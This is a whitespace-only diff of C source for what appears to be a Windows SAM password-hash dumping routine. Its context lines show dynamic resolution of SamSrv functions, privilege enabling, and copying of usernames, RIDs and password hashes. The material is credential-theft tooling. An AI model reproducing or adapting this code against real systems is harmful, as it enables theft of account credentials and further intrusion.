@@ -95,7 +95,7 @@ typedef struct
 	char realloc[8];
 	char free[5];
 	char memcpy[7];
-		
+
 	/* ntdll strings */
 	char ntdlldll[10];
 	char wcstombs[9];
@@ -110,7 +110,7 @@ typedef struct
 	/* return values */
 	DWORD			dwDataSize;
 	USERNAMEHASH	*pUsernameHashData;
-	
+
 } FUNCTIONARGS;
 
 /* define types for samsrv */
@@ -307,7 +307,7 @@ DWORD set_access_priv()
 
 		priv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
 		priv.PrivilegeCount = 1;
- 
+
 		if (!AdjustTokenPrivileges(hToken, FALSE, &priv, 0, NULL, NULL))
 		{
 			dwResult = GetLastError();
@@ -386,8 +386,8 @@ DWORD dump_sam(FUNCTIONARGS *fargs)
 	{
 		dwError = 1;
 		goto cleanup;
-	}	
-	
+	}
+
 	pSamIConnect = (SamIConnectType)fargs->GetProcAddress(hSamSrv, fargs->samiconnect);
 	pSamrOpenDomain = (SamrOpenDomainType)fargs->GetProcAddress(hSamSrv, fargs->samropendomain);
 	pSamrEnumerateUsersInDomain = (SamrEnumerateUsersInDomainType)fargs->GetProcAddress(hSamSrv, fargs->samrenumerateusersindomain);
@@ -395,9 +395,9 @@ DWORD dump_sam(FUNCTIONARGS *fargs)
 	pSamrQueryInformationUser = (SamrQueryInformationUserType)fargs->GetProcAddress(hSamSrv, fargs->samrqueryinformationuser);
 	pSamIFree_SAMPR_USER_INFO_BUFFER = (SamIFree_SAMPR_USER_INFO_BUFFERType)fargs->GetProcAddress(hSamSrv, fargs->samifree_sampr_user_info_buffer);
 	pSamIFree_SAMPR_ENUMERATION_BUFFER = (SamIFree_SAMPR_ENUMERATION_BUFFERType)fargs->GetProcAddress(hSamSrv, fargs->samifree_sampr_enumeration_buffer);
-	pSamrCloseHandle = (SamrCloseHandleType)fargs->GetProcAddress(hSamSrv, fargs->samrclosehandle);	
+	pSamrCloseHandle = (SamrCloseHandleType)fargs->GetProcAddress(hSamSrv, fargs->samrclosehandle);
 
-	if (!pSamIConnect || !pSamrOpenDomain || !pSamrEnumerateUsersInDomain || !pSamrOpenUser || !pSamrQueryInformationUser || 
+	if (!pSamIConnect || !pSamrOpenDomain || !pSamrEnumerateUsersInDomain || !pSamrOpenUser || !pSamrQueryInformationUser ||
 		!pSamIFree_SAMPR_USER_INFO_BUFFER || !pSamIFree_SAMPR_ENUMERATION_BUFFER || !pSamrCloseHandle)
 	{
 		dwError = 1;
@@ -446,7 +446,7 @@ DWORD dump_sam(FUNCTIONARGS *fargs)
 		dwError = 1;
 		goto cleanup;
 	}
-	
+
 	pWcstombs = (WcstombsType)fargs->GetProcAddress(hNtDll, fargs->wcstombs);
 	if (!pWcstombs)
 	{
@@ -537,12 +537,12 @@ DWORD dump_sam(FUNCTIONARGS *fargs)
 			{
 				dwError = 1;
 				goto cleanup;
-			} 
+			}
 			for ( i=0; i < (dwUsernameLength + 1); i++ )
 			{
 				(fargs->pUsernameHashData)[dwStorageIndex].Username[i] = 0;
 			}
-			
+
 			/* copy over the new name, length, rid and password hash */
 			pWcstombs((fargs->pUsernameHashData)[dwStorageIndex].Username, pEnumeratedUsers->pSamDomainUser[dwCurrentUser].wszUsername.Buffer, dwUsernameLength);
 			(fargs->pUsernameHashData)[dwStorageIndex].Length = dwUsernameLength;
@@ -576,7 +576,7 @@ DWORD dump_sam(FUNCTIONARGS *fargs)
 		dwError = 1;
 		goto cleanup;
 	}
-	
+
 	/* wait for the copying to finish before freeing all the allocated memory */
 	hFreeLock = fargs->OpenEvent(EVENT_ALL_ACCESS, FALSE, fargs->FreeSyncEvent);
 	if (hFreeLock == NULL)
@@ -590,7 +590,7 @@ DWORD dump_sam(FUNCTIONARGS *fargs)
 		goto cleanup;
 	}
 
-cleanup: 
+cleanup:
 
 	/* free all the allocated memory */
 	for (dwCurrentUser = 0; dwCurrentUser < dwStorageIndex; dwCurrentUser++)
@@ -601,13 +601,14 @@ cleanup:
 
 	/* close all handles */
 	pSamrCloseHandle(&hDomain);
-	pSamrCloseHandle(&hSam);	
+	pSamrCloseHandle(&hSam);
 	pLsaClose(hLSA);
 
 	/* free library handles */
 	if (hSamSrv)
 	{
-		fargs->FreeLibrary(hSamSrv);	}
+		fargs->FreeLibrary(hSamSrv);
+	}
 	if (hAdvApi32)
 	{
 		fargs->FreeLibrary(hAdvApi32);
@@ -624,7 +625,7 @@ cleanup:
 	/* signal that the memory deallocation is complete */
 	fargs->SetEvent(hReadLock);
 	fargs->CloseHandle(hReadLock);
-	
+
 	/* release the free handle */
 	fargs->CloseHandle(hFreeLock);
 
